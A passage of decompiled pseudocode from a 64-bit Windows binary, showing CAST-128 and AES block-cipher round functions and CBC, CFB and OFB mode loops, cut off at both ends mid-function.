          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v17 = *(unsigned __int8 *)--v16;
LABEL_9:
          v19 = *(unsigned __int8 *)--v16;
          v17 |= v19 << 8;
LABEL_10:
          v20 = *(unsigned __int8 *)--v16;
          v17 |= v20 << 16;
LABEL_11:
          v21 = *(unsigned __int8 *)--v16;
          v17 |= v21 << 24;
LABEL_12:
          v18 = *(unsigned __int8 *)--v16;
LABEL_13:
          v22 = *(unsigned __int8 *)--v16;
          v18 |= v22 << 8;
LABEL_14:
          v23 = *(unsigned __int8 *)--v16;
          v18 |= v23 << 16;
LABEL_15:
          v18 |= *(unsigned __int8 *)(v16 - 1) << 24;
          break;
        default:
          break;
      }
      v42 = v11 ^ v18;
      v43 = v12 ^ v17;
      sub_14008EBA0((int *)&v42, v45);
      v11 = v42;
      v12 = v43;
      *a2 = HIBYTE(v42);
      a2[1] = BYTE2(v11);
      a2[2] = BYTE1(v11);
      a2[3] = v11;
      a2[4] = HIBYTE(v12);
      a2[5] = BYTE2(v12);
      a2[6] = BYTE1(v12);
      a2[7] = v12;
    }
    *(_BYTE *)v9 = HIBYTE(v11);
    *((_BYTE *)v9 + 1) = BYTE2(v11);
    *((_BYTE *)v9 + 2) = BYTE1(v11);
    *((_BYTE *)v9 + 3) = v11;
    *((_BYTE *)v9 + 4) = HIBYTE(v12);
    *((_BYTE *)v9 + 5) = BYTE2(v12);
    result = v12 >> 8;
    *((_BYTE *)v9 + 6) = BYTE1(v12);
    *((_BYTE *)v9 + 7) = v12;
  }
  else
  {
    v25 = a5;
    v26 = a3 - 8;
    v44 = a5;
    v27 = _byteswap_ulong(*a5);
    v28 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v29 = (unsigned __int64)a3 >> 3;
      v46 = a3 - 8 - 8 * (a3 >> 3);
      do
      {
        v30 = _byteswap_ulong(*(_DWORD *)a1);
        v31 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v30;
        v32 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v31;
        a1 += 8i64;
        v43 = v32;
        sub_14008E6C0((int *)&v42, a4);
        v33 = v27 ^ v42;
        a4 = v45;
        v34 = v28 ^ v43;
        v35 = HIBYTE(v27) ^ HIBYTE(v42);
        v27 = v30;
        v28 = v32;
        *a2 = v35;
        a2[1] = BYTE2(v33);
        a2[2] = BYTE1(v33);
        a2[3] = v33;
        a2[4] = HIBYTE(v34);
        a2[5] = BYTE2(v34);
        a2[6] = BYTE1(v34);
        a2[7] = v34;
        a2 += 8;
        --v29;
      }
      while ( v29 );
      v25 = v44;
      v26 = v46;
    }
    if ( v26 != -8 )
    {
      v36 = *(unsigned __int8 *)(a1 + 6) << 8;
      v37 = _byteswap_ulong(*(_DWORD *)a1);
      v38 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
      v42 = v37;
      v47 = *(unsigned __int8 *)(a1 + 7) | v36 | v38;
      v43 = v47;
      sub_14008E6C0((int *)&v42, a4);
      v39 = v27 ^ v42;
      v40 = v28 ^ v43;
      v41 = &a2[v26 + 8];
      switch ( v26 )
      {
        case -7:
          goto LABEL_31;
        case -6:
          goto LABEL_30;
        case -5:
          goto LABEL_29;
        case -4:
          goto LABEL_28;
        case -3:
          goto LABEL_27;
        case -2:
          goto LABEL_26;
        case -1:
          goto LABEL_25;
        case 0:
          *--v41 = v40;
LABEL_25:
          *--v41 = BYTE1(v40);
LABEL_26:
          *--v41 = BYTE2(v40);
LABEL_27:
          *--v41 = HIBYTE(v40);
LABEL_28:
          *--v41 = v39;
LABEL_29:
          *--v41 = BYTE1(v39);
LABEL_30:
          *--v41 = BYTE2(v39);
LABEL_31:
          *(v41 - 1) = HIBYTE(v39);
          break;
        default:
          break;
      }
      v28 = v47;
      v27 = v37;
    }
    *(_BYTE *)v25 = HIBYTE(v27);
    *((_BYTE *)v25 + 1) = BYTE2(v27);
    *((_BYTE *)v25 + 2) = BYTE1(v27);
    *((_BYTE *)v25 + 3) = v27;
    *((_BYTE *)v25 + 4) = HIBYTE(v28);
    *((_BYTE *)v25 + 5) = BYTE2(v28);
    result = v28 >> 8;
    *((_BYTE *)v25 + 6) = BYTE1(v28);
    *((_BYTE *)v25 + 7) = v28;
  }
  return result;
}

//----- (000000014008E6C0) ----------------------------------------------------
__int64 __fastcall sub_14008E6C0(int *a1, _DWORD *a2)
{
  unsigned int v2; // r11d
  int v4; // ebx
  unsigned int v5; // r8d
  int v6; // r11d
  unsigned int v7; // eax
  int v8; // ebx
  unsigned int v9; // eax
  unsigned int v10; // edx
  unsigned int v11; // eax
  int v12; // r11d
  unsigned int v13; // eax
  int v14; // ebx
  unsigned int v15; // edx
  int v16; // r11d
  unsigned int v17; // eax
  int v18; // ebx
  unsigned int v19; // eax
  int v20; // r11d
  unsigned int v21; // edx
  int v22; // ebx
  unsigned int v23; // eax
  int v24; // r11d
  unsigned int v25; // eax
  int v26; // ebx
  unsigned int v27; // edx
  int v28; // r11d
  unsigned int v29; // eax
  int v30; // ebx
  unsigned int v31; // eax
  unsigned int v32; // r11d
  unsigned int v33; // edx
  __int64 result; // rax

  v2 = *a1;
  v4 = a1[1];
  if ( !a2[32] )
  {
    v5 = __ROL4__(v4 + a2[30], a2[31]);
    v6 = (dword_140114D10[BYTE2(v5)]
        + (dword_140114510[(unsigned __int8)v5] ^ dword_140114110[BYTE1(v5)])
        - dword_140114910[(unsigned __int64)v5 >> 24]) ^ v2;
    v7 = __ROL4__(a2[28] - v6, a2[29]);
    v8 = ((dword_140114910[(unsigned __int64)v7 >> 24] ^ (dword_140114510[(unsigned __int8)v7]
                                                        + dword_140114110[BYTE1(v7)]))
        - dword_140114D10[BYTE2(v7)]) ^ v4;
    v9 = __ROL4__(v8 ^ a2[26], a2[27]);
    v2 = (dword_140114910[(unsigned __int64)v9 >> 24] + dword_140114110[BYTE1(v9)] - dword_140114510[(unsigned __int8)v9]) ^ 0x9DB30420 ^ v6;
    v10 = __ROL4__(v2 + a2[24], a2[25]);
    v4 = (dword_140114D10[BYTE2(v10)]
        + (dword_140114510[(unsigned __int8)v10] ^ dword_140114110[BYTE1(v10)])
        - dword_140114910[(unsigned __int64)v10 >> 24]) ^ v8;
  }
  v11 = __ROL4__(a2[22] - v4, a2[23]);
  v12 = ((dword_140114910[(unsigned __int64)v11 >> 24] ^ (dword_140114510[(unsigned __int8)v11]
                                                        + dword_140114110[BYTE1(v11)]))
       - dword_140114D10[BYTE2(v11)]) ^ v2;
  v13 = __ROL4__(v12 ^ a2[20], a2[21]);
  v14 = dword_140114D10[BYTE2(v13)] ^ (dword_140114910[(unsigned __int64)v13 >> 24]
                                     + dword_140114110[BYTE1(v13)]
                                     - dword_140114510[(unsigned __int8)v13]) ^ v4;
  v15 = __ROL4__(v14 + a2[18], a2[19]);
  v16 = (dword_140114D10[BYTE2(v15)]
       + (dword_140114510[(unsigned __int8)v15] ^ dword_140114110[BYTE1(v15)])
       - dword_140114910[(unsigned __int64)v15 >> 24]) ^ v12;
  v17 = __ROL4__(a2[16] - v16, a2[17]);
  v18 = ((dword_140114910[(unsigned __int64)v17 >> 24] ^ (dword_140114510[(unsigned __int8)v17]
                                                        + dword_140114110[BYTE1(v17)]))
       - dword_140114D10[BYTE2(v17)]) ^ v14;
  v19 = __ROL4__(v18 ^ a2[14], a2[15]);
  v20 = dword_140114D10[BYTE2(v19)] ^ (dword_140114910[(unsigned __int64)v19 >> 24]
                                     + dword_140114110[BYTE1(v19)]
                                     - dword_140114510[(unsigned __int8)v19]) ^ v16;
  v21 = __ROL4__(v20 + a2[12], a2[13]);
  v22 = (dword_140114D10[BYTE2(v21)]
       + (dword_140114510[(unsigned __int8)v21] ^ dword_140114110[BYTE1(v21)])
       - dword_140114910[(unsigned __int64)v21 >> 24]) ^ v18;
  v23 = __ROL4__(a2[10] - v22, a2[11]);
  v24 = ((dword_140114910[(unsigned __int64)v23 >> 24] ^ (dword_140114510[(unsigned __int8)v23]
                                                        + dword_140114110[BYTE1(v23)]))
       - dword_140114D10[BYTE2(v23)]) ^ v20;
  v25 = __ROL4__(v24 ^ a2[8], a2[9]);
  v26 = dword_140114D10[BYTE2(v25)] ^ (dword_140114910[(unsigned __int64)v25 >> 24]
                                     + dword_140114110[BYTE1(v25)]
                                     - dword_140114510[(unsigned __int8)v25]) ^ v22;
  v27 = __ROL4__(v26 + a2[6], a2[7]);
  v28 = (dword_140114D10[BYTE2(v27)]
       + (dword_140114510[(unsigned __int8)v27] ^ dword_140114110[BYTE1(v27)])
       - dword_140114910[(unsigned __int64)v27 >> 24]) ^ v24;
  v29 = __ROL4__(a2[4] - v28, a2[5]);
  v30 = ((dword_140114910[(unsigned __int64)v29 >> 24] ^ (dword_140114510[(unsigned __int8)v29]
                                                        + dword_140114110[BYTE1(v29)]))
       - dword_140114D10[BYTE2(v29)]) ^ v26;
  v31 = __ROL4__(v30 ^ a2[2], a2[3]);
  v32 = (dword_140114910[(unsigned __int64)v31 >> 24]
       + dword_140114110[BYTE1(v31)]
       - dword_140114510[(unsigned __int8)v31]) ^ 0x9DB30420 ^ v28;
  v33 = __ROL4__(v32 + *a2, a2[1]);
  result = BYTE2(v33);
  *a1 = v30 ^ (dword_140114D10[BYTE2(v33)]
             + (dword_140114110[BYTE1(v33)] ^ dword_140114510[(unsigned __int8)v33])
             - dword_140114910[(unsigned __int64)v33 >> 24]);
  a1[1] = v32;
  return result;
}
// 140114110: using guessed type int dword_140114110[256];
// 140114510: using guessed type int dword_140114510[256];
// 140114910: using guessed type int dword_140114910[256];
// 140114D10: using guessed type int dword_140114D10[256];

//----- (000000014008EBA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14008EBA0(int *a1, _DWORD *a2)
{
  int v2; // r11d
  unsigned int v4; // r8d
  int v5; // r10d
  unsigned int v6; // eax
  int v7; // r11d
  unsigned int v8; // eax
  int v9; // r10d
  unsigned int v10; // edx
  int v11; // r11d
  unsigned int v12; // eax
  int v13; // r10d
  unsigned int v14; // eax
  int v15; // r11d
  unsigned int v16; // edx
  int v17; // r10d
  unsigned int v18; // eax
  int v19; // r11d
  unsigned int v20; // eax
  int v21; // r10d
  unsigned int v22; // edx
  int v23; // r11d
  unsigned int v24; // eax
  int v25; // r10d
  unsigned int v26; // eax
  int v27; // edx
  unsigned __int64 result; // rax
  int v29; // r11d
  unsigned int v30; // edx
  int v31; // r10d
  unsigned int v32; // eax
  unsigned int v33; // r11d
  unsigned int v34; // eax
  unsigned int v35; // edx

  v2 = a1[1];
  v4 = __ROL4__(v2 + *a2, a2[1]);
  v5 = *a1 ^ (dword_140114D10[BYTE2(v4)]
            + (dword_140114510[(unsigned __int8)v4] ^ dword_140114110[BYTE1(v4)])
            - dword_140114910[(unsigned __int64)v4 >> 24]);
  v6 = __ROL4__(v5 ^ a2[2], a2[3]);
  v7 = dword_140114D10[BYTE2(v6)] ^ (dword_140114910[(unsigned __int64)v6 >> 24]
                                   + dword_140114110[BYTE1(v6)]
                                   - dword_140114510[(unsigned __int8)v6]) ^ v2;
  v8 = __ROL4__(a2[4] - v7, a2[5]);
  v9 = ((dword_140114910[(unsigned __int64)v8 >> 24] ^ (dword_140114510[(unsigned __int8)v8] + dword_140114110[BYTE1(v8)]))
      - dword_140114D10[BYTE2(v8)]) ^ v5;
  v10 = __ROL4__(v9 + a2[6], a2[7]);
  v11 = (dword_140114D10[BYTE2(v10)]
       + (dword_140114510[(unsigned __int8)v10] ^ dword_140114110[BYTE1(v10)])
       - dword_140114910[(unsigned __int64)v10 >> 24]) ^ v7;
  v12 = __ROL4__(v11 ^ a2[8], a2[9]);
  v13 = dword_140114D10[BYTE2(v12)] ^ (dword_140114910[(unsigned __int64)v12 >> 24]
                                     + dword_140114110[BYTE1(v12)]
                                     - dword_140114510[(unsigned __int8)v12]) ^ v9;
  v14 = __ROL4__(a2[10] - v13, a2[11]);
  v15 = ((dword_140114910[(unsigned __int64)v14 >> 24] ^ (dword_140114510[(unsigned __int8)v14]
                                                        + dword_140114110[BYTE1(v14)]))
       - dword_140114D10[BYTE2(v14)]) ^ v11;
  v16 = __ROL4__(v15 + a2[12], a2[13]);
  v17 = (dword_140114D10[BYTE2(v16)]
       + (dword_140114510[(unsigned __int8)v16] ^ dword_140114110[BYTE1(v16)])
       - dword_140114910[(unsigned __int64)v16 >> 24]) ^ v13;
  v18 = __ROL4__(v17 ^ a2[14], a2[15]);
  v19 = dword_140114D10[BYTE2(v18)] ^ (dword_140114910[(unsigned __int64)v18 >> 24]
                                     + dword_140114110[BYTE1(v18)]
                                     - dword_140114510[(unsigned __int8)v18]) ^ v15;
  v20 = __ROL4__(a2[16] - v19, a2[17]);
  v21 = ((dword_140114910[(unsigned __int64)v20 >> 24] ^ (dword_140114510[(unsigned __int8)v20]
                                                        + dword_140114110[BYTE1(v20)]))
       - dword_140114D10[BYTE2(v20)]) ^ v17;
  v22 = __ROL4__(v21 + a2[18], a2[19]);
  v23 = (dword_140114D10[BYTE2(v22)]
       + (dword_140114510[(unsigned __int8)v22] ^ dword_140114110[BYTE1(v22)])
       - dword_140114910[(unsigned __int64)v22 >> 24]) ^ v19;
  v24 = __ROL4__(v23 ^ a2[20], a2[21]);
  v25 = dword_140114D10[BYTE2(v24)] ^ (dword_140114910[(unsigned __int64)v24 >> 24]
                                     + dword_140114110[BYTE1(v24)]
                                     - dword_140114510[(unsigned __int8)v24]) ^ v21;
  v26 = __ROL4__(a2[22] - v25, a2[23]);
  v27 = dword_140114910[(unsigned __int64)v26 >> 24] ^ (dword_140114510[(unsigned __int8)v26]
                                                      + dword_140114110[BYTE1(v26)]);
  result = BYTE2(v26);
  v29 = (v27 - dword_140114D10[result]) ^ v23;
  if ( !a2[32] )
  {
    v30 = __ROL4__(v29 + a2[24], a2[25]);
    v31 = (dword_140114D10[BYTE2(v30)]
         + (dword_140114510[(unsigned __int8)v30] ^ dword_140114110[BYTE1(v30)])
         - dword_140114910[(unsigned __int64)v30 >> 24]) ^ v25;
    v32 = __ROL4__(v31 ^ a2[26], a2[27]);
    v33 = (dword_140114910[(unsigned __int64)v32 >> 24]
         + dword_140114110[BYTE1(v32)]
         - dword_140114510[(unsigned __int8)v32]) ^ 0x9DB30420 ^ v29;
    v34 = __ROL4__(a2[28] - v33, a2[29]);
    v25 = ((dword_140114910[(unsigned __int64)v34 >> 24] ^ (dword_140114510[(unsigned __int8)v34]
                                                          + dword_140114110[BYTE1(v34)]))
         - dword_140114D10[BYTE2(v34)]) ^ v31;
    v35 = __ROL4__(v25 + a2[30], a2[31]);
    result = (unsigned __int64)v35 >> 16;
    v29 = (dword_140114D10[BYTE2(v35)]
         + (dword_140114510[(unsigned __int8)v35] ^ dword_140114110[BYTE1(v35)])
         - dword_140114910[(unsigned __int64)v35 >> 24]) ^ v33;
  }
  *a1 = v29;
  a1[1] = v25;
  return result;
}
// 140114110: using guessed type int dword_140114110[256];
// 140114510: using guessed type int dword_140114510[256];
// 140114910: using guessed type int dword_140114910[256];
// 140114D10: using guessed type int dword_140114D10[256];

//----- (000000014008F070) ----------------------------------------------------
unsigned __int8 __fastcall sub_14008F070(
        unsigned __int8 *a1,
        unsigned __int8 *a2,
        int a3,
        _DWORD *a4,
        unsigned __int8 *a5,
        int *a6,
        int a7)
{
  int *v8; // r12
  int v9; // esi
  unsigned __int8 *v10; // r14
  unsigned __int8 *v11; // r15
  int v12; // ebx
  unsigned __int8 *v13; // rbp
  __int64 v14; // r15
  int v15; // edx
  int v16; // eax
  int v17; // ecx
  unsigned __int8 v18; // al
  int v19; // ecx
  unsigned __int8 v20; // al
  unsigned __int8 result; // al
  unsigned __int8 *v22; // rbp
  int v23; // edx
  int v24; // eax
  int v25; // ecx
  unsigned __int8 v26; // al
  int v27; // ecx
  unsigned __int8 v28; // al
  unsigned __int8 v29; // dl
  unsigned __int8 v30; // cl

  v8 = a6;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *a6;
  if ( a7 )
  {
    if ( a3 )
    {
      v13 = a5;
      v14 = a1 - a2;
      do
      {
        --v9;
        if ( !v12 )
        {
          v15 = v13[4] << 24;
          v16 = v13[5];
          LODWORD(a5) = v13[3] | (v13[2] << 8) | ((v13[1] | (*v13 << 8)) << 16);
          HIDWORD(a5) = (v16 << 16) | v15 | v13[7] | (v13[6] << 8);
          sub_14008EBA0((int *)&a5, a4);
          v17 = (int)a5;
          *v13 = BYTE3(a5);
          v13[1] = BYTE2(v17);
          v18 = (unsigned __int8)a5;
          v13[2] = BYTE1(v17);
          v19 = HIDWORD(a5);
          v13[3] = v18;
          v13[4] = HIBYTE(v19);
          v13[5] = BYTE2(v19);
          v20 = BYTE4(a5);
          v13[6] = BYTE1(v19);
          v13[7] = v20;
        }
        result = v13[v12] ^ v10[v14];
        *v10++ = result;
        v13[v12] = result;
        v12 = ((_BYTE)v12 + 1) & 7;
      }
      while ( v9 );
    }
  }
  else if ( a3 )
  {
    v22 = a5;
    do
    {
      --v9;
      if ( !v12 )
      {
        v23 = v22[4] << 24;
        v24 = v22[5];
        LODWORD(a5) = v22[3] | (v22[2] << 8) | ((v22[1] | (*v22 << 8)) << 16);
        HIDWORD(a5) = (v24 << 16) | v23 | v22[7] | (v22[6] << 8);
        sub_14008EBA0((int *)&a5, a4);
        v25 = (int)a5;
        *v22 = BYTE3(a5);
        v22[1] = BYTE2(v25);
        v26 = (unsigned __int8)a5;
        v22[2] = BYTE1(v25);
        v27 = HIDWORD(a5);
        v22[3] = v26;
        v22[4] = HIBYTE(v27);
        v22[5] = BYTE2(v27);
        v28 = BYTE4(a5);
        v22[6] = BYTE1(v27);
        v22[7] = v28;
      }
      v29 = *v11++;
      result = v12;
      v30 = v22[v12];
      v22[v12] = v29;
      *v10++ = v30 ^ v29;
      v12 = ((_BYTE)v12 + 1) & 7;
    }
    while ( v9 );
  }
  *v8 = v12;
  return result;
}

//----- (000000014008F290) ----------------------------------------------------
__int64 __fastcall sub_14008F290(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6)
{
  int v7; // r8d
  int *v8; // r13
  int v10; // ecx
  int v11; // r10d
  int v12; // r15d
  int v13; // ebx
  int v14; // r10d
  int v15; // r8d
  int v16; // ecx
  unsigned int v17; // r8d
  __int64 result; // rax
  _DWORD *v19; // r13
  __int64 v20; // r12
  unsigned __int8 v21; // dl
  unsigned __int8 v22; // r9
  int v23; // [rsp+20h] [rbp-40h] BYREF
  unsigned int v24; // [rsp+24h] [rbp-3Ch]
  _DWORD *v25; // [rsp+28h] [rbp-38h]
  int *v26; // [rsp+30h] [rbp-30h]
  unsigned __int8 *v27; // [rsp+38h] [rbp-28h]
  char v28; // [rsp+40h] [rbp-20h]
  char v29; // [rsp+41h] [rbp-1Fh]
  char v30; // [rsp+42h] [rbp-1Eh]
  char v31; // [rsp+43h] [rbp-1Dh]
  char v32; // [rsp+44h] [rbp-1Ch]
  char v33; // [rsp+45h] [rbp-1Bh]
  char v34; // [rsp+46h] [rbp-1Ah]
  char v35; // [rsp+47h] [rbp-19h]

  v7 = a5[4];
  v8 = a6;
  v10 = a5[6];
  v11 = *a5;
  v27 = a5;
  v12 = 0;
  v13 = *a6;
  v14 = a5[3] | (a5[2] << 8) | (a5[1] << 16) | (v11 << 24);
  v25 = (_DWORD *)a4;
  v15 = (a5[5] << 16) | (v7 << 24);
  v26 = a6;
  v16 = a5[7] | (v10 << 8);
  v23 = v14;
  v17 = v16 | v15;
  v31 = v14;
  v24 = v17;
  v28 = HIBYTE(v14);
  v29 = BYTE2(v14);
  v30 = BYTE1(v14);
  v32 = HIBYTE(v17);
  v33 = BYTE2(v17);
  result = v17 >> 8;
  v34 = BYTE1(v17);
  v35 = v17;
  if ( a3 )
  {
    v19 = v25;
    v20 = a2 - (_QWORD)a1;
    v21 = v17;
    v22 = v14;
    do
    {
      --a3;
      if ( !v13 )
      {
        sub_14008EBA0(&v23, v19);
        v14 = v23;
        v17 = v24;
        v22 = v23;
        v21 = v24;
        v28 = HIBYTE(v23);
        v29 = BYTE2(v23);
        v30 = BYTE1(v23);
        v32 = HIBYTE(v24);
        v33 = BYTE2(v24);
        v34 = BYTE1(v24);
        ++v12;
        v31 = v23;
        v35 = v24;
      }
      result = v13;
      a1[v20] = *a1 ^ *(&v28 + v13);
      ++a1;
      v13 = ((_BYTE)v13 + 1) & 7;
    }
    while ( a3 );
    v8 = v26;
    if ( v12 )
    {
      *v27 = HIBYTE(v14);
      a5[1] = BYTE2(v14);
      a5[2] = BYTE1(v14);
      a5[3] = v22;
      a5[4] = HIBYTE(v17);
      result = HIWORD(v17);
      a5[5] = BYTE2(v17);
      a5[6] = BYTE1(v17);
      a5[7] = v21;
    }
  }
  *v8 = v13;
  return result;
}

//----- (000000014008F480) ----------------------------------------------------
__int64 __fastcall sub_14008F480(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int *v4; // r13
  unsigned __int64 v5; // r11
  unsigned __int64 v6; // r10
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r9
  unsigned int v9; // ebp
  unsigned int v10; // r14d
  unsigned int *v11; // r15
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // r8
  int v14; // r12d
  unsigned __int64 v15; // r9
  unsigned __int64 v16; // rsi
  unsigned __int64 v17; // rdi
  unsigned __int64 v18; // rbx
  unsigned __int64 v19; // r11
  int v20; // eax
  int v21; // eax
  int v22; // eax
  __int64 result; // rax

  v4 = a2;
  v5 = a3[3] ^ (__ROL4__(a1[3], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[3], 8) & 0xFF00FF00));
  v6 = a3[2] ^ (__ROL4__(a1[2], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[2], 8) & 0xFF00FF00));
  v7 = a3[1] ^ (__ROL4__(a1[1], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[1], 8) & 0xFF00FF00));
  v8 = *a3 ^ (__ROL4__(*a1, 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(*a1, 8) & 0xFF00FF00));
  v9 = a3[4] ^ dword_140117D10[(unsigned __int8)v7] ^ dword_140117110[v8 >> 24] ^ dword_140117510[BYTE2(v5)] ^ dword_140117910[BYTE1(v6)];
  v10 = a3[5] ^ dword_140117D10[(unsigned __int8)v6] ^ dword_140117110[v7 >> 24] ^ dword_140117910[BYTE1(v5)] ^ dword_140117510[BYTE2(v8)];
  v11 = a3 + 8;
  v12 = a3[6] ^ dword_140117D10[(unsigned __int8)v5] ^ dword_140117110[v6 >> 24] ^ dword_140117510[BYTE2(v7)] ^ dword_140117910[BYTE1(v8)];
  v13 = a3[7] ^ dword_140117D10[(unsigned __int8)v8] ^ dword_140117110[v5 >> 24] ^ dword_140117510[BYTE2(v6)] ^ dword_140117910[BYTE1(v7)];
  v14 = ((int)a3[60] >> 1) - 1;
  if ( (int)a3[60] >> 1 != 1 )
  {
    do
    {
      v15 = (unsigned __int64)v9 >> 24;
      v16 = v11[3] ^ (unsigned int)dword_140117D10[(unsigned __int8)v9] ^ (unsigned int)dword_140117110[v13 >> 24] ^ (unsigned int)dword_140117510[BYTE2(v12)] ^ (unsigned __int64)(unsigned int)dword_140117910[BYTE1(v10)];
      v17 = v11[2] ^ (unsigned int)dword_140117D10[(unsigned __int8)v13] ^ (unsigned int)dword_140117110[v12 >> 24] ^ (unsigned int)dword_140117510[BYTE2(v10)] ^ (unsigned __int64)(unsigned int)dword_140117910[BYTE1(v9)];
      v18 = v11[1] ^ (unsigned int)dword_140117D10[(unsigned __int8)v12] ^ (unsigned int)dword_140117110[(unsigned __int64)v10 >> 24] ^ (unsigned int)dword_140117910[BYTE1(v13)] ^ (unsigned __int64)(unsigned int)dword_140117510[BYTE2(v9)];
      v19 = *v11 ^ (unsigned int)dword_140117D10[(unsigned __int8)v10] ^ (unsigned int)dword_140117110[v15] ^ (unsigned int)dword_140117510[BYTE2(v13)] ^ (unsigned __int64)(unsigned int)dword_140117910[BYTE1(v12)];
      v9 = v11[4] ^ dword_140117D10[(unsigned __int8)v18] ^ dword_140117110[v19 >> 24] ^ dword_140117510[BYTE2(v16)] ^ dword_140117910[(unsigned __int8)((unsigned __int16)(v11[2] ^ dword_140117D10[(unsigned __int8)v13] ^ dword_140117110[v12 >> 24] ^ dword_140117510[BYTE2(v10)] ^ dword_140117910[BYTE1(v9)]) >> 8)];
      v10 = v11[5] ^ dword_140117D10[(unsigned __int8)v17] ^ dword_140117110[v18 >> 24] ^ dword_140117910[BYTE1(v16)] ^ dword_140117510[(unsigned __int8)((*v11 ^ dword_140117D10[(unsigned __int8)v10] ^ dword_140117110[v15] ^ dword_140117510[BYTE2(v13)] ^ dword_140117910[BYTE1(v12)]) >> 16)];
      v12 = v11[6] ^ dword_140117D10[(unsigned __int8)v16] ^ dword_140117110[v17 >> 24] ^ dword_140117510[BYTE2(v18)] ^ dword_140117910[BYTE1(v19)];
      v13 = v11[7] ^ dword_140117D10[(unsigned __int8)v19] ^ dword_140117110[v16 >> 24] ^ dword_140117510[BYTE2(v17)] ^ dword_140117910[BYTE1(v18)];
      v11 += 8;
      --v14;
    }
    while ( v14 );
    v4 = a2;
  }
  v20 = *v11 ^ RijnDael_AES_inv_LONG_140118110[(unsigned __int8)v10] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE1(v12)] ^ (((RijnDael_AES_inv_LONG_140118110[(unsigned __int64)v9 >> 24] << 8) ^ RijnDael_AES_inv_LONG_140118110[BYTE2(v13)]) << 8)) << 8);
  *v4 = __ROL4__(v20, 8) & 0xFF00FF | __ROR4__(v20, 8) & 0xFF00FF00;
  v21 = v11[1] ^ RijnDael_AES_inv_LONG_140118110[(unsigned __int8)v12] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE1(v13)] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE2(v9)] ^ (RijnDael_AES_inv_LONG_140118110[(unsigned __int64)v10 >> 24] << 8)) << 8)) << 8);
  v4[1] = __ROL4__(v21, 8) & 0xFF00FF | __ROR4__(v21, 8) & 0xFF00FF00;
  v4[2] = __ROL4__(
            v11[2] ^ RijnDael_AES_inv_LONG_140118110[(unsigned __int8)v13] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE1(v9)] ^ (((RijnDael_AES_inv_LONG_140118110[(unsigned __int64)(unsigned int)v12 >> 24] << 8) ^ RijnDael_AES_inv_LONG_140118110[BYTE2(v10)]) << 8)) << 8),
            8) & 0xFF00FF | __ROR4__(
                              v11[2] ^ RijnDael_AES_inv_LONG_140118110[(unsigned __int8)v13] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE1(v9)] ^ (((RijnDael_AES_inv_LONG_140118110[(unsigned __int64)(unsigned int)v12 >> 24] << 8) ^ RijnDael_AES_inv_LONG_140118110[BYTE2(v10)]) << 8)) << 8),
                              8) & 0xFF00FF00;
  v22 = v11[3] ^ RijnDael_AES_inv_LONG_140118110[(unsigned __int8)v9] ^ ((RijnDael_AES_inv_LONG_140118110[BYTE1(v10)] ^ (((RijnDael_AES_inv_LONG_140118110[(unsigned __int64)(unsigned int)v13 >> 24] << 8) ^ RijnDael_AES_inv_LONG_140118110[BYTE2(v12)]) << 8)) << 8);
  result = __ROL4__(v22, 8) & 0xFF00FF | __ROR4__(v22, 8) & 0xFF00FF00;
  v4[3] = result;
  return result;
}
// 140117110: using guessed type int dword_140117110[256];
// 140117510: using guessed type int dword_140117510[256];
// 140117910: using guessed type int dword_140117910[256];
// 140117D10: using guessed type int dword_140117D10[256];
// 140118110: using guessed type unsigned __int8 RijnDael_AES_inv_LONG_140118110[260];

//----- (000000014008FA50) ----------------------------------------------------
__int64 __fastcall sub_14008FA50(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int *v4; // r13
  unsigned __int64 v5; // r11
  unsigned __int64 v6; // r10
  unsigned __int64 v7; // r9
  unsigned __int64 v8; // r8
  unsigned int v9; // ebp
  unsigned int v10; // r14d
  unsigned int *v11; // r15
  unsigned int v12; // edx
  unsigned __int64 v13; // r10
  int v14; // r12d
  unsigned __int64 v15; // rsi
  unsigned __int64 v16; // rdi
  unsigned __int64 v17; // rbx
  unsigned __int64 v18; // r9
  unsigned int v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // eax
  __int64 result; // rax

  v4 = a2;
  v5 = a3[2] ^ (__ROL4__(a1[2], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[2], 8) & 0xFF00FF00));
  v6 = a3[1] ^ (__ROL4__(a1[1], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[1], 8) & 0xFF00FF00));
  v7 = a3[3] ^ (__ROL4__(a1[3], 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(a1[3], 8) & 0xFF00FF00));
  v8 = *a3 ^ (__ROL4__(*a1, 8) & 0xFF00FF | (unsigned __int64)(__ROR4__(*a1, 8) & 0xFF00FF00));
  v9 = a3[4] ^ dword_140116D10[(unsigned __int8)v7] ^ RijnDael_AES_Base_140116110[v8 >> 24] ^ dword_140116910[BYTE1(v5)] ^ dword_140116510[BYTE2(v6)];
  v10 = a3[5] ^ dword_140116D10[(unsigned __int8)v8] ^ RijnDael_AES_Base_140116110[v6 >> 24] ^ dword_140116510[BYTE2(v5)] ^ dword_140116910[BYTE1(v7)];
  v11 = a3 + 8;
